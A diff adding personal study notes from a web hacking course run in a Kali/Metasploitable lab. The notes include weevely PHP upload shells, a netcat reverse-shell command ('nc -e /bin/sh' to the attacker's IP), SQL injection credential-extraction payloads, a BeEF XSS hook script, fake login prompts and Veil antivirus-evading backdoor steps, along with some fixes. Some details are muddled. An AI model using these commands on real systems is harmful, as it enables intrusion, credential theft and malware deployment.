@@ -1,0 +1,1045 @@
+Kali Linux:
+	username: root
+	password: toor
+
+Metasploitable:
+	username: msfadmin
+	password: msfadmin
+
+
+
+
+Kali Linux is going to be the OS that we're going to use to launch our attacks
+Metasploitable is going to be used as a target system for our attacks launched from Kali Linux
+Both Kali Linux and Matsploitable are Operating Systems that will be hosted on a virtual machine
+VMware is our virtual machine of choice
+
+
+
+In Kali Linux:
+	On the top left corner we have Applications and Places:
+		Applications is a list of possible attacks that we can perform
+		Places is just a list of quick access folders on our OS(just like windows explorer)
+
+	The Desktop folder is also the /root folder
+
+	On the top right corner we have the workspaces(similar to desktops in windows)
+
+	To comute between workspaces we use Ctrl + Alt + Up/Down
+
+	On the top right corner we can also control the volume and the wifi networks of the OS, the user status and the battery percentage
+
+
+Linux Comands:
+	ls -l command prints all the files along with details about each one of them
+
+	apt-get:						allows us to install programmes from the terminal
+	apt-get update:					updates all the existing programmes to their newest version
+	apt-get install programmeName: 	installs the programme called "programmeName"
+
+	sudo command: 					runs the command in admin mode
+
+terminator is a terminal that allows us to have multiple terminal windows open at the same time
+apt-get install terminator:		installs the programme called "terminator"
+
+
+Metasploitable is our victim/target
+Metasploitable has multiple web servers installed on it
+
+to get the ip of the web server installed on Metasploitable use:
+	ifconfig
+in the terminal, then copy the ip adress and paste it on the browser to enter the site
+the ip adress is on the "inet adrr" line
+
+our ip adress is: 192.168.243.129
+
+Metasploitable must be open and running in order for the ip adress to work
+
+
+
+
+
+
+
+
+
+Section 3:
+(Website Basics)
+
+	A website is just an application installed on a computer
+
+	A server is a computer that hosts the website application and on which the literal website runs on
+
+	A client computer is an everyday computer that is used by usual people
+
+	Whenever a user accesses a link, that link is sent to a "DNS Server"
+
+	A DNS Server is just a computer that takes as an input a link("www.facebook.com") and returns that website link's corresponding ip adress
+
+	With that returned ip adress, the access request is then passed further to the corresponding server that hosts the web application whose ip adress is the same as the one returned
+
+	After we have accessed the server, the code from the web application is executed ON THE SERVER(not using the client computer's specs)
+
+	Then the server returns the client files(html, css, js) to the client computer, so that the client computer can execute the client files using the client computer's specs
+
+	Summary: the backend languages(php, mysql, apache) are executed by the web server(another computer) and the client languages(html, css, js) are executed on the client's computer
+
+
+
+	In our case, the server is going to be Metasploitable, we don't use a DNS server because we have the ip adress already
+
+	php, mysql and phpmyadmin are just technologies used on the web server, but the web server itself is Metasploitable machine
+
+
+	There is more than just a way to hack a website:
+		web application pentesting = hacking the application itself(by interacting with it, with its database, on its components)
+		server side attacks = attacks on the server(computer) that hosts the website/the OS/applications that the server has installed on it
+		client side attacks = attacks on the humans(admins) that manage those servers = targeting the humans who control the website to get access via them
+
+	This course will be focused on web application pentesting
+
+
+
+Section 4:
+(Information Gathering)
+
+	Before we try to hack a website, we need to gathern essential info about that website.
+
+	Whois Lookup = a website that contains a database with info about the owner of our target website
+		Example: when we register a domain name, we have to submit details about ourselves(name, etc)
+		Whois Lookup let us input the domain name and get info about the admin, company of the website, etc
+
+	NetCraft Site Report = Shows what technologies are used on the target website
+
+	Robtex DNS Lookup = Shows comprehensive DNS info about the target website
+		(DNS server converts link names to ip adresses)
+		We can also find what other websites are hosted on the same server
+		If we are able to hack into any website that is on the same server with our target website, we can use that to our advantage and have an easier time getting into our target website
+
+	A subdomain is a completely different website that is part of a main website
+	Example: mail.google.com is a subdomain of the main domain named google.com
+
+	In terminator we can use the tool "knockpy" to find all the subdomains of a domains:
+		knockpy google.com
+
+
+
+
+	In Metasploitable, all the websites hosted on this server are located in /var/www
+
+	There are always files/directories that are hidden in a web server, we can use dirb to find those files/directories:
+		dirb http://192.168.243.129/mutillidae
+	
+
+	After using dirb, we might find a hidden login page, this page would be important if we could hack into passwords and use them to login through that hidden page.
+	We can also find a phpinfo file which contains a lot of useful information
+	We can also find a robots.txt file which tells search engines such as google how to deal with the website, usually it contains info/files that the admin of the website wants to hide from google.
+		In the robots.txt file we might find the name of a hidden directory which contains info about the passwords of the users of the website
+		This shows how powerful and important Information Gathering can be
+
+
+
+	Maltego:
+		Maltego is a programme that allows us to gathern information about pretty much everything
+		We can gathern info about the users using their username and password, we can gathern info about the websites, servers, anything.
+
+		Maltego is a programme located in Kali Linux
+		When we first run Maltego we have to create a username and password
+
+		The username and password are the ones from work in my case
+
+		When we create a new graph in maltego:
+			The middle panel is called a "graph" and it's where our entities are displayed
+			The left panel is called the "pallete" and it's where we add our entities
+			The bottom left panel is where we can run transformers
+
+		We can add a website to the pallete and display it on the graph via its domain name
+		We can use a transformer to display in the graph all the website that have a given ip adress
+		We can further get the email adresses asociated with a website
+
+		Summary: Maltego is a programme that exists in Kali Linux that allows us to display in a graph representation all the website/info we have
+			(it looks like a detective pinboard)
+
+
+
+
+Section 5:
+(File Upload Vulnerabilities)
+
+
+	File Upload Vulnerabilities are the simplest type of vulnerabilities because they allow us to upload any type of file
+	If the target computer understands a php file, we can upload any type of php file or a php shell and get full control over the target computer.
+		(same applies for any other language)
+	We can use a tool called weevely which generates php files that allows us to gain control of the target computer
+
+	Good Practice: after using any tools such as the one mentioned above, it's best to first gather information and then test the website for ourselves
+					and see if we can notice any vulnerabilities or exploits
+
+
+	We might notice after testing the frontend of the website for ourselves that there is an upload section
+	Based on the security of the backend, the upload section might restrict uploads to only a couple of type of files
+	For example: we might have a section that only allows us to upload images rather than any type of document
+	Whilst, this might not always be the case and such we can exploit this vulnerability and upload files which could help us gain control over the website
+
+
+	Now if we can upload any type of file, then we can use a php file/shell. We can create this file using a tool designed for web application penetration testing: weevely
+
+	To create the php file/shell we use weevely in terminator using the following syntax:
+		weevely generate <password> <filePathtoThePlaceWhereWeStoreIt>
+
+	Example:
+		weevely generate 123456 /root/shell.php
+
+	To connect with the uploaded weevely create file we use:
+		weevely <linkToTheUploadedShell> <password>
+
+	Example:
+		weevely http://192.168.243.129/dvwa/hackable/uploads/shell.php 123456
+
+
+	After we connected to the shell that we uploaded we are able to use weevely to execute linkux commands directly to the server computer which hosts the very site in which we uploaded the shell
+	We can use the command "help" in weevely to see all the features we can use exclusively via weevely.
+		One of those features allows us to execute SQL queries
+
+	
+	GET/POST Requests + File Upload Vulnerabilities:
+		In the client side/frontend of the website a user might click on a link, that link generates a request via javascript
+		which is sent to the server that handles the request via php/backend and sometimes might have to deal with the database(SQL)
+		When the server deals with the request, it returns a response, that response is usually under the form of an html response
+
+		A GET request usually contains a "page=" in the url
+		A POST request is just like the upload section we've talked about earlier
+
+		We don't see a POST request in the URL because it sent directly to the server and handled there
+
+		In the GET requests, we can modify them directly from the url, this is not true for the POST requests
+
+		To be able to intercept a POST request we can use the BURP Proxy
+
+		Burp Proxy intercepts the POST request by configuering the browser to send the POST requests first to proxy instead of directly sending it to the server
+
+		When we get the POST request in the proxy, we can modify it and only then send it to the server
+
+		Burp Proxy is part of the Burp Suite
+
+		Burp Proxy is available in Kali Linux, when we open it for the first time we can choose to create a temporary project
+
+		We can use "Open Browser" to open the built-in browser of Burp Suite
+
+		When the Interceptor is on, any POST request will be intercepted and shown in our programme.
+
+		After intercepting a POST request, we can use "Forward" to forward the request to the server and continue the normal flow of the website/see what happens next
+			We can modify the requests in shown in the Burp Suite textbox and then forward them
+
+		If we want to upload a php shell but the website only restricts uploading to just images, we can try to upload the shell
+			and use Burp Proxy to intercept the upload request and modify the request such that it says that a shell is uploaded but the type of the file is not .php but .jpg
+
+		The easy upload vulnerability was when we could upload any file to that website, the medium upload vulnerability was when the website would only allow images to be uploaded
+			and we had to intercept the upload request and modify the type of the file to image, even if the file wasn't an image
+
+		A hard upload vulnerability is when the easy and medium vulnerabilities don't work. In this case, the backend of the website is probably detecting that we intercept the upload requests
+		and we modify the type of the file, but not it's extension. Based on the quality of the backend security code, it might just be checking if we uploaded a file that doesn't end with a .jpg extension.
+		In this case, we can try different combinations of file names until we get it right and crack the backend security code.
+		If originally we wanted to upload a shell with filename = "shell.php" and the Content-Type = "image/jpeg", we can leave the Content-Type the way it is, but we can change the filename to be
+		"shell.jpg.php", which might work, or "shell.php.jpg", which usually works. We can have different patterns and we have to try each one until we notice that it can pass the security.
+
+		When we name the shell "shell.php.jpg", this might corrupt the php file, but usually we can still use it as a normal php shell and connect to it remotely via weevely to gain control over the website server.
+
+	
+	
+	Security + Fixing File Upload Vulnerabilities:
+		1. Never allow users to upload executables(php, exe, etc)
+		2. Check the file type AND the file extension
+			
+			easy vulnerabilities = not checking file type and not checking file extension
+			medium vulnerability = checking only the file type but not the file extension
+			hard vulnerability = checking only the file extension but not the file type
+
+			no vulnerability = checking both the file type and the file extension + recreating the uploaded file using php-Imagick
+		
+		3. Analyse the uploaded file itself, recreate it and rename it
+
+	
+
+
+
+Section 6:
+(Code Execution Vulnerabilities)
+
+	These types of vulnerabilities allows the attacker to execute OS specific commands(windows, linux, etc)
+
+	It's a big problem, because it allows us to do anything we want with the target server
+
+	One example of a Code Execution Vulnerability is when we have a text box in which we can give input text, whatever that input text
+	is, we will execute the input text into a terminal on the server. This is a big deal because anyone can write any command in that text
+	box and it will be directly executed by the server.
+
+	To find out if an input textbox can have this vulnerability or not we should test it by giving it or sorts of input and see if it breaks or missperforms
+
+	If the website has this vulnerability, we can exploit this by remotely controling the target server's terminal through our own computer's terminal using Netcat:
+	(This will only work if both the server and the attacker's computer have Netcat installed through the terminal)
+		nc -vv -l -p 8080
+
+	Netcat is just a tool that allows us to listen and connect two computers together:
+		-vv allows us to see the output of the commands
+		-l means listen
+		-p means port
+		8080 is the port we're listening to
+			So we're basically saying "Listen to the port 8080 and print the output of the comands"
+	
+	If a website doesn't have a direct vulnerability to running commands as input in a textbox by using the ; symbol to separate each command
+	we can use the pipe | to force the execution of two commands.
+
+	After using the pipe | we can use Netcat to remotely connect the two computers
+
+	To connect the two computers, the following command must be executed from the server after we've started listening to port 8080 on our computer:
+		nc -e /bin/sh <attackersComputerIPadress>
+
+	
+	
+	Security + Fixing Code Execution Vulnerabilities:
+
+		1. Avoid dangerous functons
+		2. Filter use input before execution
+
+		We can use Regex to setup rules about the format of how the input should look like
+		such that we allow only non-harmful input and nothing else
+
+		Example: if we have an input for an ip adress, we can setup Regex to accept input with the format "dd.dd.dd.ddd" where d stands for digit
+				 if we put anything else, the web app shall refuse it
+		Without Regex, we can make a simple php or python script that takes an input, say an ip adress, it strips any slashes if they might exist
+		it separates the ip adress based on dots, then the result should be an array of 4 numbers, we check each element of the array if it is indeed a number
+		if at least one element is not a number then that means the ip is not valid.
+
+
+
+
+Sectiion 7:
+(Local FIle Inclusion Vulnerabilities(LFI))
+
+	These vulnerabilities allow us to read any file within the same server
+
+	We can find the file containing all user passwords of the current computer in the etc/passwd path
+
+	We can gain shell access to the target server by injecting code into readable files
+		Examples of these files would be:
+			/proc/self/environ				== a file that contains an array with info about the current environment
+			/var/log/auth.log				== a file with all the login attempts on the website
+			/var/log/apache2/access.log
+
+	First Method:
+		We open /proc/self/environ from the url tab, we will find a variable called USER_AGENT which is basically the name of the browser
+		We can modify the USER_AGENT such that it uses a shell instead of the browser
+		We open the shell using Netcat by making the target server run: nc -e /bin/sh <attackersComputerIPadress>
+		just like we did before, then we setup Netcat on our computer
+		In the course, we did this by using the passthru function on php
+
+
+	Second Method:
+		We open the /var/log/auth.log file and notice that it logs even failed attempts to login
+		This means that if we put an incorrect username or password, it will still be logged into that file
+		Therefore, we can inject php code to setup the shell into the auth.log file.
+		
+		We can try this method with any other .log file as long as we figure out how we can inject code into that file
+
+		The shell was setup using SSH
+
+
+
+Section 8:
+(Remote File Inclusion Vulnerabilities(RFI))
+	
+	This is a special case of File Inclusion Vulnerabilities
+	The idea is to be able to upload/inject any file from our computer to the target server
+
+	LFI = allows us to acces the server's local files
+	RFI = allows us to remotely upload/inject our files to the server
+
+	Before we can perform the RFI we have to setup some php settings
+	
+	We need to enable allow_url and allow_url_fopen on our local web server in order to be enable in order for this to work.
+
+
+	(I need to revise more on this section)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Section 9:
+(SQL Injection Vulnerabilities)
+
+	SQL Injection Vulnerabilities are a popular type of vulnerabilities
+
+	Most websites use databases. Databases are used to store data(usernames, passwords, etc).
+
+	This interaction between the website and the database is done using SQL.
+
+	In mysql command line:
+		"show databases;" 		displayes all the databases available
+		"use databaseName" 		connects to table called "databaseName"
+		"show tables;" 			displayes all the tables of a database(we need to use that database first)
+
+
+	If you manage to find an sql injection then there is pretty much no need to try to exploit anything else because we have all the data/info we need to hack the website
+
+	The problem with php shells is that we can exploit the server, but we don't really get a chance to find info about passwords or credit card numbers or any other sensitive information just like we do via a database exploit.
+
+
+	We can also use a database injection to upload files or read files.
+
+	An SQL Injection can be used for File Inclusion Vulnerabilities and File Upload Vulnerabilities.
+
+
+
+	The next 4 sections will be about Exploitation - SQL Injection:
+	(SQL Injection = SQLi)
+
+
+
+
+
+
+Section 10:
+(SQL Injection Vulnerabilities - SQLi in Login Pages)
+
+	Whenever we see URL parameters that are something = something we can exploit that for our SQLi
+
+	If we are lucky, when we enter a username or password in a login form on a website, that login form could take the input that it
+	got from the text boxes and insert them into an SQL query such as 
+		SELECT * FROM accounts WHERE username = '' AND password = ''
+	In that case, we can use an SQL statement when we enter our username or password to perform an SQLi
+
+	If we insert the character ' into the username or password it will most probably crack the SQL query because it will try to match the username or password with "'" which is invalid.
+
+	An easy(least secure) SQLi would be when we can play with the sql statement directly by inserting anything into the username or password input box
+
+	A medium SQLi would be when the input boxes have some kind of filtering which doesn't allow characters such as ' or #(for commenting) to be inserted
+
+		This filtering could happen either on the client side(javascript) or in the backend(php, node, etc)
+		If it happens at the client side, the input is being filtered before it is sent to the server.
+		If it happens at the server side, the input gets filtered once it has arrived at the server.
+
+		If it happens in the client side, it is easy to bypass using Burp Proxy just like we did before, we intercept the send request and modify it such that we remove the filtration that has been made.
+
+		Burp Proxy can also help us figure out if this filtering is happening at the client side or on the server
+		if we receive an error before the request has even been intercepted, it means the filtering is happening on the client side
+
+		Therefore, we can instead insert a valid password that passes the filter but isn't in the database, through that password we generate 
+		a request which we intercept and after that we can modify the password to insert our SQLi.
+
+		Basically, we avoid the error caused by the filtering by just inserting a normal password and interchange the password with our SQLi once we intercept the request in Burp Proxy
+
+
+
+	On a high security website:
+		the filtering would occur on the server side, usually using a php/backend language script that strips the password of any unwanted characters
+		and leaves only letters and numbers from the original password.
+
+		It is not the best way to secure the website, but it is good enough as a temporary solution.
+
+	
+	The best way to secure a website from SQLi will be shown in the last part of section 12.
+
+
+
+
+
+section 11:
+(SQLi Vulnerabilities - Extracting Data From The Database)
+
+	On some websites, instead of a login form we might have a form that also takes a username and password and gives us some info about the account(non-evasive info)
+
+	We can exploit this from the URL tab and playing with the php parameters
+
+	When we try to write characters such as # in a parameter from the URL tab, the character might cause an error, so instead we can use %23 to represent the character #
+
+	We cab also use union select to get data about more than just one topic:
+
+		union select database(), user(), version()
+
+	This SQL command will select the name of the database, the name of the current user and the version of the OS
+
+	Once we know the name of the database, we can select the tables:
+
+		union select table_name from information_schema.tables
+
+	information_schema.tables is a predefined table in SQL that contains info about all the tables existing in every database
+
+		union select table_name from information_schema.tables where table_schema = 'owasp10'
+
+	We're selecting all the tables which belong to the database called "owasp10"
+
+	Extracting Sensitive Data Such As Passwords:
+
+		Now that we have the name of the tables, we can try to find a table related to info about the user accounts of the website
+
+		We first have to find out what columns a table has:
+
+			union select column_name from information_schema.columns where table_name= 'accounts'
+
+		Now that we know that the accounts table has an username and password columns:
+			
+			union select 1, username, password, is_admin, 5 from accounts
+
+		
+	
+
+Section 12:
+(SQLi Vulnerabilities - Advanced Exploitation)
+
+	Discovering & Exploiting Blind SQL Injections:
+
+		A blind SQLi is an injection that doesn't display any errors to us(the attacker)
+
+		This doesn't mean that the page doesn't have any SQLi Vulnerabilities, it simply just means that it doesn't display errors to the attacker.
+
+		The way to test a Blind SQLi is to give multiple true and false inputs.
+
+		If we give a false input, the website will display an invalid page.
+
+		Sometimes, when we want perform an SQLi in the URL, the SQL "where" clause might not work for quoted strings
+		so we have to decode that string using the Burp Decoder(just like we did before with %23 for # and %27 for ')
+		The Burp Decoder must be set for URL. We will be decoding the string.
+		Example: 'dvwa' = %64 %76 %77 %61
+		In the URL we write: 0x64767761
+
+		Whenever we use the where clause, we have to convert the string using the Burp Decoder without the quotes.
+
+	Bypassing Filters:
+
+		If we have backend filters we can bypass them:
+			if the server blacklisted words such as 'and' or 'order by', we can write them as following:
+				aNd, anD, orDeR bY
+			and it will still work
+
+			If the spaces are blacklisted, we can use the + symbol or open and close comments:
+				uNioN+sEleCt+1,2+%23
+				uNioN/**/sEleCt/**/1,2/**/%23
+	
+	
+	Bypassing Security & Accesing All Records:
+
+		This is a very common scenario
+
+
+
+		I have to revise this subsection
+
+		To revise sections 55-59
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Section 13:
+(XSS Vulnerabilities)
+
+	XSS = Cross Site SCripting Vulnerabilities
+
+	XSS allows an attacker to inject javascript into a page
+	
+	JS is a client-side language so the code injected will be executed on the client's computer(client-side)
+
+	XSS has three main types:
+		1. Persisten/Stored XSS		= the code injected will be stored in the database or on the page(in the html file as a <script> tag)
+		2. Reflected XSS			= the code will be executed only when the client runs a specific URL
+		3. DOM based XSS			= the code will interpreted and ran only on the client-side without ever getting sent to the server => it bypasses all validations
+
+	Discovering XSS: Test text boxes and url parameters on the form
+
+	Easy level: We can insert JS code into a text box or url parameter "name=<script></script>" and it might get executed
+
+	Medium level:
+		Usually the website has a filter that doesn't allow for JS to be injected
+		We can use: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+		We basically modify the capitalisation: <sCripT>alert("xss")</scRipt>
+	
+	Advanced level:
+
+		We can also use the link above.
+		In this case, the filtering from the website removes the quotes.
+
+		Up to this point, we have injected the JS code directly to the html file as a <script> tag.
+
+		In more advanced websites, any input that is injected is first put in a try block in an html <script> tag.
+		Therefore, we have to inspect the way that our input is injected and try to figure out how we can modify it
+		in order to make it work.
+
+		Conclusion: the way we exploit a website may vary from website to website 
+					=> we have to figure out how to insert our exploitation such that it works with the vulnerability
+
+
+
+	Discovering Stored XSS:
+
+		A stored XSS is very similar to a reflected one: 
+			it allows us to inject JS code into a browser
+			the code is executed on the people that visit the page
+			The only differece is that with the reflected XSS you have to send the URL to the target
+			In the stored XSS, the code will be stored in the database or into the page => everytime any person runs that page, the code will be executed.
+
+		Therefore, stored XSS is more dangerous than reflected XSS.
+
+
+
+
+Section 14:
+(XSS Vulnerabilities - Exploitation)
+
+
+	Lesson 66:
+		In order to test the exploits we need a target machine => it's better to have target machines as virtual machines
+
+		Windows 10 is a very popular OS for virtual machines => we're going to install it as a virtual machine in VMware
+
+		link: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
+
+		We're going to select:
+			Virtual Machines: "MSEdge on Win10 (x64) Stable 1809"
+			VM platform: "VMware (Windows, Mac)"
+			
+		and then download a .zip archive, the zip is 6.7GB.
+
+		After installing we have to unzip it.
+
+		We import it to VMware and set the memory to 2GB instead of 4GB.
+
+		The Login Password is: Passw0rd!
+
+		When we run the virtual machine, if we want to make it fullscreen we have to change the display settings and set the resolution to be the same as our monitor.
+		We might also have to change the scalling if we have a high resolution monitor(such as 4k resolution)
+
+
+	Hooking Victims Using Beef Framework:
+
+		The Beef Framework allows us to run a large amount of commands to hook browsers.
+
+		Setup:
+			Run Beef from Kali Linux, it will open a browser with a login form.
+			Username: beef
+			Password: beef
+
+		Beef provides us with some Javascript code that we can inject into our target webiste.
+		We need to modify the <IP> with our own in order for this to work:
+		(to get our IP adress we use "ifconfig" in terminator)
+			<script src = "http://<IP>:3000/hook.js"></script>
+		
+		This will allow us to hook beef into our target website.
+
+
+
+		The stored XSS way of hooking up Beef is much better because it doesn't leave a trace of a suspicious looking URL behind.
+		Stored XSS executes the hooking whenever a person accesses a desired page on our target website.
+
+		We inject the stored XSS by simpling inserting the code in a form on the desired page.
+		Now whenever a person enters that page, he will get hooked automatically.
+
+
+	Interacting With Hooked Targets:
+
+		On the Beef website, our hooked targets are shown on the left panel.
+
+		Clicking on the IP of a target will give us details about the target's computer, as well as the page that got them hooked to Beef.
+
+		These details are useful when we want to design exploitation code for those hooked targets.
+
+
+	Running Basic Commands On Victims:
+
+		We have commands of information gathering, exploits, etc.
+		We even have redirecting commands which can be used to alarm the user that they must update/download something and we can redirect them to a website of our choice.
+
+	
+!!!! Stealing Credentials/Passwords Using A Fake Login Prompt:
+
+		The way it works is that it locks out the website screen and tells the user that they got logged out of the current session.
+		This is a type of civil engineering(and perhaps keylogging) in which we make the user authenticate all over again and hence we get his credentials.
+
+
+	
+
+	Bonus:
+
+
+		Veil - Framework:
+
+			A backdoor is a file that gives us full control over the machine that it gets executed on.
+
+			Backdoors can be caught by Anti-Virus programmes.
+
+			Veil is a framework for generating UNDETECTABLE backdoors.
+			(this isn't that hard to achieve)
+
+			Before we can use Veil we need to install it, the installation script is available in the resources of lesson 72.
+
+			In order to be able to run the installation, we have to open terminator on the folder in which the install-veil file is located.
+			Then we need to convert the installation file to an executable, we do this via the following command:
+
+				chmod +x install-veil
+
+			chmod = change mode
+			+x = add executable
+
+			What that command does is saying "Change the mode of the install-veil file such that you add executable to it"
+
+			To run the executable we do:
+				./install-veil
+
+			
+			During the installation, we need to press Yes only once, any other questions which ask us to say yes will be ignored at some point by the installation so there is no need for us to accept.
+
+
+			To run the programme we just type "veil" into the command line.
+
+			Veil will show us the available commands:
+				exit 		= Exit Veil
+				info		= Information on a specific tool
+				list		= List available tools
+				update		= Update Veil
+				use			= Use a specific tool
+
+
+			Veil has two main tools, we use the "list" command to print them, those tools being:
+				1) Evasion
+				2) Ordnance
+
+			
+			Evasion generates undetectable backdoors for us.
+			Ordnance generates the payloads that are used by Evasion(it's like a secondary tool)
+				(payload = part of the code, of the backdoor, the part does the evil stuff for us)
+
+
+			To select to use the Evasion tool, after using "list" we use:
+				use 1
+
+			1 because Evasion is the tool with index 1
+
+			After we load Veil-Evasion, we get a new set of commands. 
+			We can still use "list" to print all the available payloads.
+
+			We have 41 different payloads, all of which follow a certain naming pattern:
+				language/typeOfPayloadAndCode/methodUsedToEstablishConnection
+			
+			
+			Example:
+				go/meterpreter/rev_https.py
+
+			meterpreter is a really good type of payload because it allows us to play with the target's computer, 
+			we can install keyloggers on it, we can open the mic and camera on them, we can even use their computer to hack into other computers.
+
+			The above mentioned example of a payload has the index 15, so we type:
+				use 15
+			
+			Initially, we will get info about the current payload, as well as the options that we can set for this payload.
+
+			The most important option that we can set for our payload is the IP adress.
+
+			Since we are using a reverse https connection, the IP adress will be the IP of our current Kali machine.
+
+			We get our Kali's current IP by using "ifconfig", then we set the IP adress by doing the following:
+				set LHOST <IP>
+
+			where <IP> is our current IP.
+
+			then:
+				set LPORT 8080
+
+			We can verify the options by using:
+				options
+
+			
+			Now we can bypass all the antivirus programmes except for AVG.
+
+			The way that antiviruses work is that they have a huge database in which they store
+			the signatures of all the files that contain harmful code.
+
+			So what they do is that they compare our file/backdoor to all of the files in the database.
+			If the file matches a signature, then it will be marked as harmful/malware.
+			If it doesn't, then the file will not be concidered as a malware.
+
+			=> We have to modify our backdoor in order to make it more unic such that it bypasses the antiviruses
+
+			Veil pretty much did this for us, it bypassed all but one antiviruses.
+
+			Therefore, we can set some optional options that really won't do much of a difference, they'll only make the backdoor a little different.
+
+			We can modify the minimum number of processors used by the backdoor:
+				set PROCESSORS 1
+			
+			We can modify the number of seconds that our backdoor is sleeping before it executes the payload:
+				set SLEEP 6
+
+			Now that all the options are the way we wanted them to be, we can generate the backdoor by typing:
+				generate
+
+			We have to name the backdoor that we are generating.
+			(in the lesson we named it "rev_https_8080")
+
+			After we have generated the backdoor, we can test it by uploading it to these websites:
+				https://nodistribute.com/
+				https://spyralscanner.net/
+				https://zsecurity.org/bypassing-anti-virtus-hacking-windows-10-using-empire/
+
+
+			We should test the backdoor once in a while because antiviruses always update their database and Veil does that as well.
+
+
+		Listening For Incoming Connections:
+			
+			The backdoor that we have created uses a reverse payload => it does not open a port from a target computer
+			Instead, it connects from the target computer to our computer => it will pass firewalls.
+
+			In order to receive incoming connections, we need to listen to the port we have setup(8080)
+			
+
+
+			(I have to revise this lesson as well(75))
+
+			
+			
+			
+			
+			
+			I have to revise lessons 75-77
+
+
+
+
+
+
+	Preventing XSS Vulnerabilities:
+
+		These types of vulnerabilities occur because whenever someone inputs something into a text box, that text box gets sent to the html file.
+		Therefore, it's treated as part of the page and if there is any javascript in it, it will get executed.
+
+		To minimize this vulnerability it's best to avoid the usage of untrusted input.
+		=> minimize the times that a user has to input something into a textbox
+
+		XSS can also be injected into parameters of html elements, not just in textboxes.
+
+		We should also escape the input. Escaping means encrypting the input using a sed of codes from a table of values(ASCII, URL Coding, UTF8, etc)
+
+		Escaping in this context means representing symbols into their counterpart in html.
+
+
+
+
+
+
+Section 15:
+(Insecure Session Management)
+
+	Logging In As Admin Without a Password By Manipulating Cookies:
+
+		We need a plugin that allows us to modify cookies.
+		Theis plugin is called "Cookie Editor Firefox" for the Firefox browser from Kali Linux.
+
+		One of the main advantages of using cookies on a website is that it allows a user to only login once at the start of the session
+		and the user will not be logged out once he/she tries to reach another page within the website.
+
+		Cookies have a date of expiry and will eventually log the current user out.
+		Sometimes Cookies are configuered in a way that are easily manipulated.
+
+		We can login as admin by modifying the cookie to log me as the user with the id 1(admin)
+
+		In reality, cookies are more complex and have features such as session tokens, which basically give a unique id that isn't related to the user id purely for the current session.
+
+
+	Cross Site Request Forgery(CSRF):
+
+		This attack forces the user to make things that they didn't want to make(such as forcing them to change their passwords without them realising it)
+
+
+
+		(I have to revise lessons 80-83)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Section 16:
+(Brute Force & Dictionary Attacks)
+
+	Let's assume we've tried all the above mentioned methods to crack a password, we've tried them on all the websites on the same server and didn't work.
+	None of the websites is vulnerable.
+
+	If after trying all those methods nothing came to be, we can try Brute Force attacks.
+
+	Brute Force attacks are a very effective method. This type of exploit consists in trying all the possible combination for a password(sort of like guessing the correct password but at an industrial level)
+
+	There are two flavours of Brute Force/Guessing attacks:
+		1. Brute Force Attacks 	= Cover all possbile combinations
+		2. Dictionary Attacks 	= Use a wordlist, try every password in the list only
+
+
+	Creating a Wordlist:
+
+		We're going to use a tool called "crunch", syntax:
+
+			crunch [min] [max] [characters] -t [pattern] -o [FileName]
+
+		Example:
+
+			crunch 6 8 123abc$ -i wordlist -t a@@@@b
+
+		Generated passes:
+			aaaaab
+			aabbbb
+			aan$$b
+
+		We can also use the -p tag option to only get passwords which don't have repeating characters
+
+		Best way to familiarise ourselves with crunch is to use man crunch
+
+
+		Example:
+
+			crunch 6 8 abc12 -o test.txt
+
+		This generates all the passwords with minum 6 characters and up to 8 characters from the list of characters "abc12" and puts this output in the test.txt file
+
+		-t tag option allows us to give a pattern
+
+		Example:
+			crunch 6 6 abc12 test.txt -t a@@@@b
+
+		We will generate all the password that start with a and end with b and have random characters in the middle, the random characters will be from "abc12"
+
+
+	Guessing Login Password Using a Wordlist Attack With Hydra:
+
+		Now that we have generated a wordlist(or have got one from the internet)
+		We can launch a wordlist attack using a tool called Hydra.
+
+		Syntax:
+
+			hydra [IP] -L [usernames] -P [passwords] [service]
+
+		The [service] argument is the most important and the most tricky => Pay attention
+		We have to provide a supported service, hydra will print a list of supported services.
+		If we provide an unsupported service, it won't work.
+
+		Example:
+
+			hydra 10.20.14.212 -l admin -P /root/test.txt http-post-form
+
+
+
+Section 17:
+(Scanning Target Website For Vulnerabilities)
+
+	So far we've learned how to discover a number of dangerous vulnerabilities + how they work + how to exploit them
+
+	In order to scan for vulnerabilities on a website we're going to use a tool called ZAP.
+
+	ZAP can be launched from Kali Linux.
+
+	We press on the green plus in the mid bottom corner, we create a new Active Scan
+	We select Add Scan then Default Policy
+	
+	Then we can just copy the link of the website we want to scan and paste it in the search bar
+
+
+Section 18:
+(Post Exploitation)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
